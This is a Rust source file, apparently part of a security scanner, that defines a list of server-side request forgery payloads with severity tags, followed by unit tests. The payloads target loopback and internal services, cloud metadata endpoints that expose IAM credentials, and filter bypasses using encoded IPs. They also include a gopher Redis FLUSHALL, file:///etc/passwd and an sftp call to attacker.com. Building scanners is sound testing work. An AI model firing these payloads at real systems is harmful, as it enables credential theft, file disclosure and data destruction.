use super::{Payload, PayloadType, Severity};

pub fn get_payloads() -> Vec<Payload> {
    let mut payloads = Vec::new();

    let localhost = vec![
        ("http://localhost", "Direct localhost", Severity::Critical),
        ("http://127.0.0.1", "Loopback IP", Severity::Critical),
        (
            "http://127.0.0.1:80",
            "Loopback with port",
            Severity::Critical,
        ),
        ("http://127.1", "Shortened loopback", Severity::Critical),
        (
            "http://127.0.0.1.nip.io",
            "nip.io DNS rebinding",
            Severity::High,
        ),
        ("http://[::1]", "IPv6 loopback", Severity::Critical),
        (
            "http://[0:0:0:0:0:0:0:1]",
            "Full IPv6 loopback",
            Severity::Critical,
        ),
        ("http://0.0.0.0", "All interfaces", Severity::Critical),
        ("http://0", "Zero IP", Severity::High),
        ("http://127.0.0.1:22", "SSH port", Severity::High),
        ("http://127.0.0.1:3306", "MySQL port", Severity::High),
        ("http://127.0.0.1:6379", "Redis port", Severity::Critical),
        (
            "http://127.0.0.1:11211",
            "Memcached port",
            Severity::Critical,
        ),
        ("http://127.0.0.1:27017", "MongoDB port", Severity::Critical),
    ];

    let cloud_metadata = vec![
        (
            "http://169.254.169.254/latest/meta-data/",
            "AWS metadata v1",
            Severity::Critical,
        ),
        (
            "http://169.254.169.254/latest/meta-data/hostname",
            "AWS hostname",
            Severity::Critical,
        ),
        (
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "AWS IAM credentials",
            Severity::Critical,
        ),
        (
            "http://169.254.169.254/latest/user-data",
            "AWS user data",
            Severity::Critical,
        ),
        (
            "http://169.254.169.254/metadata/v1/",
            "Azure metadata",
            Severity::Critical,
        ),
        (
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "Azure instance",
            Severity::Critical,
        ),
        (
            "http://metadata.google.internal/computeMetadata/v1/",
            "GCP metadata",
            Severity::Critical,
        ),
        (
            "http://metadata.google.internal/computeMetadata/v1/project/project-id",
            "GCP project ID",
            Severity::Critical,
        ),
        (
            "http://metadata.google.internal/computeMetadata/v1/instance/hostname",
            "GCP hostname",
            Severity::High,
        ),
        (
            "http://169.254.169.254/openstack/latest/meta_data.json",
            "OpenStack metadata",
            Severity::Critical,
        ),
        (
            "http://169.254.169.254/etcd",
            "DigitalOcean metadata",
            Severity::Critical,
        ),
    ];

    let bypass_techniques = vec![
        ("http://localtest.me", "localtest.me DNS", Severity::High),
        ("http://localh.st", "localh.st DNS", Severity::High),
        ("http://lvh.me", "lvh.me DNS", Severity::High),
        ("http://vcap.me", "vcap.me DNS", Severity::High),
        (
            "http://127.0.0.1.xip.io",
            "xip.io DNS rebinding",
            Severity::High,
        ),
        (
            "http://spoofed.burpcollaborator.net",
            "Burp collaborator",
            Severity::High,
        ),
        (
            "http://customer1.app.localhost.my.company.127.0.0.1.nip.io",
            "Long nip.io",
            Severity::High,
        ),
        ("http://127.1.1.1", "Variant loopback", Severity::Critical),
        ("http://127.0.1", "Shortened variant", Severity::Critical),
        (
            "http://2130706433",
            "Decimal IP (127.0.0.1)",
            Severity::Critical,
        ),
        (
            "http://3232235521",
            "Decimal IP (192.168.0.1)",
            Severity::High,
        ),
        (
            "http://0x7f000001",
            "Hex IP (127.0.0.1)",
            Severity::Critical,
        ),
        (
            "http://0x7f.0x0.0x0.0x1",
            "Mixed hex IP",
            Severity::Critical,
        ),
        ("http://0177.0.0.1", "Octal IP", Severity::Critical),
        ("http://017700000001", "Full octal IP", Severity::Critical),
        (
            "http://127.0.0.1%00.example.com",
            "Null byte in URL",
            Severity::High,
        ),
        (
            "http://127.0.0.1#.example.com",
            "Fragment bypass",
            Severity::High,
        ),
        (
            "http://127.0.0.1?.example.com",
            "Query bypass",
            Severity::High,
        ),
    ];

    let protocol_smuggling = vec![
        (
            "gopher://127.0.0.1:6379/_INFO",
            "Gopher Redis INFO",
            Severity::Critical,
        ),
        (
            "gopher://127.0.0.1:6379/_FLUSHALL",
            "Gopher Redis FLUSHALL",
            Severity::Critical,
        ),
        (
            "gopher://127.0.0.1:11211/_stats",
            "Gopher Memcached",
            Severity::Critical,
        ),
        (
            "dict://127.0.0.1:6379/INFO",
            "Dict Redis INFO",
            Severity::Critical,
        ),
        ("file:///etc/passwd", "File protocol", Severity::Critical),
        (
            "file:///c:/windows/win.ini",
            "File protocol Windows",
            Severity::Critical,
        ),
        ("sftp://attacker.com/file", "SFTP protocol", Severity::High),
        ("ldap://localhost", "LDAP protocol", Severity::High),
        ("tftp://localhost/file", "TFTP protocol", Severity::Medium),
    ];

    let internal_services = vec![
        (
            "http://localhost:8080/manager/html",
            "Tomcat manager",
            Severity::Critical,
        ),
        (
            "http://localhost:8161/admin",
            "ActiveMQ admin",
            Severity::Critical,
        ),
        ("http://localhost:9042", "Cassandra", Severity::High),
        (
            "http://localhost:9200/_cat/indices",
            "Elasticsearch indices",
            Severity::Critical,
        ),
        ("http://localhost:5601", "Kibana", Severity::High),
        (
            "http://localhost:15672",
            "RabbitMQ management",
            Severity::Critical,
        ),
        (
            "http://localhost:8500/v1/catalog/nodes",
            "Consul nodes",
            Severity::High,
        ),
        (
            "http://localhost:8200/v1/sys/seal-status",
            "Vault seal status",
            Severity::High,
        ),
        (
            "http://localhost:2379/version",
            "etcd version",
            Severity::High,
        ),
        ("http://localhost:9000", "SonarQube", Severity::Medium),
        ("http://localhost:9001", "Hadoop NameNode", Severity::High),
        ("http://localhost:50070", "HDFS NameNode", Severity::High),
        ("http://localhost:8089", "Locust", Severity::Medium),
    ];

    for (payload, desc, severity) in localhost {
        payloads.push(Payload {
            payload_type: PayloadType::Ssrf,
            payload: payload.to_string(),
            description: desc.to_string(),
            severity,
            tags: vec!["localhost".to_string()],
        });
    }

    for (payload, desc, severity) in cloud_metadata {
        payloads.push(Payload {
            payload_type: PayloadType::Ssrf,
            payload: payload.to_string(),
            description: desc.to_string(),
            severity,
            tags: vec!["cloud-metadata".to_string()],
        });
    }

    for (payload, desc, severity) in bypass_techniques {
        payloads.push(Payload {
            payload_type: PayloadType::Ssrf,
            payload: payload.to_string(),
            description: desc.to_string(),
            severity,
            tags: vec!["bypass".to_string(), "dns-rebinding".to_string()],
        });
    }

    for (payload, desc, severity) in protocol_smuggling {
        payloads.push(Payload {
            payload_type: PayloadType::Ssrf,
            payload: payload.to_string(),
            description: desc.to_string(),
            severity,
            tags: vec!["protocol-smuggling".to_string()],
        });
    }

    for (payload, desc, severity) in internal_services {
        payloads.push(Payload {
            payload_type: PayloadType::Ssrf,
            payload: payload.to_string(),
            description: desc.to_string(),
            severity,
            tags: vec!["internal-services".to_string()],
        });
    }

    payloads
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn payloads_non_empty() {
        let payloads = get_payloads();
        assert!(!payloads.is_empty(), "SSRF payloads must not be empty");
    }

    #[test]
    fn all_payloads_are_ssrf_type() {
        for p in get_payloads() {
            assert_eq!(p.payload_type, PayloadType::Ssrf);
        }
    }

    #[test]
    fn contains_localhost_variants() {
        let payloads = get_payloads();
        let has_localhost = payloads
            .iter()
            .any(|p| p.payload.contains("localhost") || p.payload.contains("127.0.0.1"));
        assert!(has_localhost, "Must contain localhost/127.0.0.1 payloads");
    }

    #[test]
    fn contains_aws_metadata() {
        let payloads = get_payloads();
        let has_aws = payloads
            .iter()
            .any(|p| p.payload.contains("169.254.169.254"));
        assert!(
            has_aws,
            "Must contain AWS metadata endpoint (169.254.169.254)"
        );
    }

    #[test]
    fn contains_gcp_metadata() {
        let payloads = get_payloads();
        let has_gcp = payloads
            .iter()
            .any(|p| p.payload.contains("metadata.google.internal"));
        assert!(has_gcp, "Must contain GCP metadata endpoint");
    }

    #[test]
    fn contains_ipv6_loopback() {
        let payloads = get_payloads();
        let has_ipv6 = payloads
            .iter()
            .any(|p| p.payload.contains("[::1]") || p.payload.contains("0:0:0:0:0:0:0:1"));
        assert!(has_ipv6, "Must contain IPv6 loopback payloads");
    }

    #[test]
    fn contains_gopher_protocol() {
        let payloads = get_payloads();
        let has_gopher = payloads.iter().any(|p| p.payload.starts_with("gopher://"));
        assert!(
            has_gopher,
            "Must contain gopher:// protocol smuggling payloads"
        );
    }

    #[test]
    fn contains_file_protocol() {
        let payloads = get_payloads();
        let has_file = payloads.iter().any(|p| p.payload.starts_with("file://"));
        assert!(has_file, "Must contain file:// protocol payloads");
    }

    #[test]
    fn cloud_metadata_is_critical() {
        let payloads = get_payloads();
        let cloud: Vec<&Payload> = payloads
            .iter()
            .filter(|p| p.tags.contains(&"cloud-metadata".to_string()))
            .collect();
        assert!(!cloud.is_empty(), "Must have cloud metadata payloads");
        for p in cloud {
            assert!(
                matches!(p.severity, Severity::Critical | Severity::High),
                "Cloud metadata payloads should be Critical or High"
            );
        }
    }

    #[test]
    fn contains_internal_service_ports() {
        let payloads = get_payloads();
        let has_redis = payloads.iter().any(|p| p.payload.contains(":6379"));
        let has_memcached = payloads.iter().any(|p| p.payload.contains(":11211"));
        assert!(has_redis, "Must target Redis port 6379");
        assert!(has_memcached, "Must target Memcached port 11211");
    }

    #[test]
    fn minimum_payload_count() {
        let payloads = get_payloads();
        assert!(
            payloads.len() >= 30,
            "Must have substantial SSRF payload coverage, got {}",
            payloads.len()
        );
    }
}
